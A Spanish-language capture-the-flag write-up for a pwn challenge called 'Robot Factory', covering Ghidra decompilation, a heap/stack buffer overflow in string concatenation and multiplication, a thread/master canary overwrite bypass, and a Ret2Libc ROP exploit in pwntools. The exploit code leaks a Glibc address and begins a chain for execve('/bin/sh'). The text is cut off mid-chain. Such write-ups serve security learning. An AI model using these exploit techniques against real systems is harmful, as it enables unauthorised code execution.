Ingeniería inversa

Vamos a abrir el binario en Ghidra para analizar el código en C descompilado. Esta es la función main:

void main() {
  pthread_t thread;
  
  setvbuf(stdout, NULL, 2, 0);
  puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
  puts("|                                 |");
  puts("|  WELCOME TO THE ROBOT FACTORY!  |");
  puts("|    DAYS WITHOUT AN ACCIDENT:    |");
  puts("|               0                 |");
  puts("=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=");
  pthread_create(&thread, NULL, self_destruct_protocol, NULL);  

  do {
    create_robot();
  } while (true);
}

Podemos ver que comienza un hilo (thread) para llamar a self_destruct_protocol:

void self_destruct_protocol() {
  int i;

  do {
    for (i = 0; i < 8; i++) {
      if ((robots[i] != NULL) && (robots[i][1].is_used[0] != '\0')) {  
        if (robots[i]->kind == 0) {
          printf("Result: %ld", *(undefined8 *) robots[i]->result);
        } else if (robots[i]->kind == 1) {
          printf("Result: %s", *(undefined8 *) robots[i]->result);
        }

        write(1, "\n", 2);
        free(robots[i]);
        robots[i] = NULL;
      }
    }

    sleep(1);
  } while (true);
}

Como se puede observar, esta función itera a través de todos los robots y libera aquellos que ya se han usado.

Estructura del robot

En la función anterior, hay una estructura llamada robot. Esto es parte del proceso de ingeniería inversa. Ghidra permite definir una struct personalizada para que el código sea más legible. Después de leer todo el código fuente descompilado, podemos inferir una estructura que se ajuste más o menos.

Una función importante es create_robot:

Esta nos permite crear dos tipos de robots: n/s. Esto último significa “number” (kind = 0) o “string” (kind = 1). A continuación, necesitamos decir la operación: a/s/m, que indica “add” (operation = 0), “substract” (operation = 1) y “multiply” (operation = 2). Los siguientes son dos valores que pueden ser enteros long o punteros char * (item_a e item_b). Después de eso, hay otro valor long/char * para el resultado, y luego size_a y size_b para el tamaño de item_a e item_b en los casos de “string”.

Al final, hay otro hilo que llama a do_robot:

void do_robot(robot *robot) {
  if (robot->kind == 0) {
    do_num(robot);
  } else if (robot->kind == 1) {  
    do_string(robot);
  }
}

Estas son do_num y do_string:

void add_func(robot *robot) {
  if (robot->kind == 0) {
    *(long *) robot->result = (long) robot->item_b + (long) robot->item_a;
  } else if (robot->kind == 1) {
    memcpy(robot->result, robot->item_a, robot->size_a);
    memcpy((void *) ((long) robot->result + robot->size_a), robot->item_b, robot->size_b);  
    free(robot->item_a);
    free(robot->item_b);
  }
}

void sub_func(robot *robot) {
  if (robot->kind == 0) {
    *(long *) robot->result = (long) robot->item_a - (long) robot->item_b;
  } else if (robot->kind == 1) {
    do {
      invalidInstructionException();
    } while (true);
  }
}

void multiply_func(robot *robot) {
  long i;
  long length;
  
  if (robot->kind == 0) {
    *(long *) robot->result = (long) robot->item_b * (long) robot->item_a;
  } else if (robot->kind == 1) {
    memcpy(robot->result, robot->item_a, robot->size_a);
    length = robot->size_a;

    for (i = 0; i < (long) robot->item_b; i = i + 1) {
      memcpy((void *)((long) robot->result + length), robot->item_a, robot->size_a);
      length = length + robot->size_a;
    }
  }
}

Vulnerabilidad de Buffer Overflow

Puede ser difícil detectar, pero add_func y multiply_func tienen una vulnerabilidad de Buffer Overflow en robots de tipo “string”. El programa intenta implementar algo como "string_a" + "string_b" o "string" * multiplier en Python. El problema es que el programa no verifica la longitud total de la cadena resultante. Canarios y threads

Como se puede ver, el canario está ahí: 0x165610803d504700. Se coloca antes de los valores guardados de $rbp y $rip para mitigar los exploits de Buffer Overflow.

Esta vez, el programa usa hilos (threads), y hay una vulnerabilidad de Buffer Overflow. El problema con los hilos es que usan una pila (stack) que se coloca en la pila de proceso principal. Además, el canario del thread se copia del canario principal del proceso (también conocido como master canary). Por lo tanto, si modificamos ambos canarios (el del thread y el del master), burlaremos la protección del canario ya que ambos valores serán los mismos (el programa pensará que están intactos, porque el programa solo compara el canario del thread con el master canary).

Obsérvese que hay más pilas de hilos en la pila principal (al menos dos, uno para el robot actual y otro para self_destruct_protocol):

Estrategia de explotación

El master canary es el tercero. Para evitar el canario, usaremos multiply_func para repetir fragmentos de 248 bytes (la mayoría de caracteres serán A para garantizar que todos los canarios se sobrescriban con 0x4141414141414141). La longitud del fragmento se debe a que tenemos un máximo de 256 bytes (en realidad 255 más el carácter de salto de línea). Un valor de las repeticiones de 9 está bien (podría ser necesario depurar con GDB para encontrar un valor adecuado).

El objetivo de esto es evitar la protección del canario y explotar la vulnerabilidad del Buffer Overflow utilizando una cadena ROP (como en la mayoría de los exploits). Haremos un ataque Ret2Libc típico (filtrando una dirección de Glibc para burlar ASLR y luego ejecutar system("/bin/sh")). Para obtener más información sobre ataques Ret2Libc, consulte Here’s a LIBC, Shooting Star o Notepad as a Service.

Desarrollo del exploit

Dado que los ataques Ret2Libc están cubiertos en otros retos con más detalles, solo mostraré las partes relevantes que afectan directamente este reto específico.

Fugando direcciones de memoria

Esta es el payload de la primera cadena ROP (para filtrar una función de Glibc usando la GOT y la PLT):

def create_robot(p, kind: bytes, operation: bytes, a: bytes, b: bytes):  
    p.recv(timeout=0.1)
    p.sendline(kind)
    p.sendlineafter(b'(a/s/m) > ', operation)
    p.sendlineafter(b': ', a)
    p.sendlineafter(b': ', b)


def main():
    p = get_process()
    rop = ROP(elf)

    rop_chain  = p64(rop.rdi.address)
    rop_chain += p64(elf.got.printf)
    rop_chain += p64(elf.plt.puts)
    rop_chain += p64(elf.plt.sleep)

    payload  = b'A' * 32
    payload += rop_chain
    payload += b'A' * (248 - len(payload))

    create_robot(p, b's', b'm', payload, b'9')

    printf_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))
    glibc.address = printf_addr - glibc.sym.printf

    p.success(f'Glibc base address: {hex(glibc.address)}')
    p.interactive()

Nótese que la última llamada de función de la cadena ROP es sleep (no main como de costumbre). Esto se debe a que estamos cambiando el flujo de ejecución de un hilo (thread). Configurar la última llamada de función a sleep hará que el hilo siga esperando indefinidamente (porque $rdi tendrá un gran valor, esa es la dirección de una entrada de la GOT).

Obteniendo RCE

La próxima cadena ROP ejecutará execve("/bin/sh", NULL, NULL). No es posible usar system porque esta función llama a fork.Como estamos tratando con un hilo, un proceso bifurcado se dará un error. Por lo tanto, es mejor ejecutar execve, que es una función más simple (en realidad, es una función que ejecuta una llamada de sistema sys_execve).

Tendremos que establecer otros registros, pero nada más complicado que eso:

    rop = ROP([elf, glibc])

    rop_chain  = p64(rop.rdi.address)
    rop_chain += p64(next(glibc.search(b'/bin/sh')))
    rop_chain += p64(rop.rsi.address)
    rop_chain += p64(0)
    rop_chain += p64(rop.find_gadget(['pop rdx', 'pop r12', 'ret']).address)
